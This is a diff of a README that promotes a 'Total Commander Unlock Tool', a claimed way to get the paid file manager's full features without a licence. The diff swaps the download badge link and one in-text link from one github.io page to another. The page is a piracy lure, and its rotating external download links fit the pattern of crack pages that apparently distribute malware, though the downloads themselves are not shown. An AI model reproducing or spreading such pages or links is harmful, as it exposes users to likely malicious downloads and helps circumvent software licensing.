@@ -6,7 +6,7 @@
 <h1 align="center">📂 Total Commander Unlock Tool</h1>
 
 <p align="center">
-  <a href="https://hiopal3847.github.io/.github/204" target="_blank">
+  <a href="https://commanderload.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/Download%20Total%20Commander%20Unlock%20Tool-Unlock%20Full%20File%20Manager%20Power-005BBB?style=for-the-badge&logo=windows&logoColor=white" 
          alt="Download Total Commander Unlock Tool" style="width: 540px; height: 37px;">
   </a>
@@ -102,7 +102,7 @@ Open an issue or submit a pull request — contributions are welcome.
 ## ⭐ Unlock Total Commander – Go Beyond File Management
 
 Boost your file navigation and management capabilities.  
-[Get the Unlock Tool](https://hiopal3847.github.io/.github/204) and experience Total Commander without limits.
+[Get the Unlock Tool](https://commanderload.github.io/.github/) and experience Total Commander without limits.
 
 ---
 
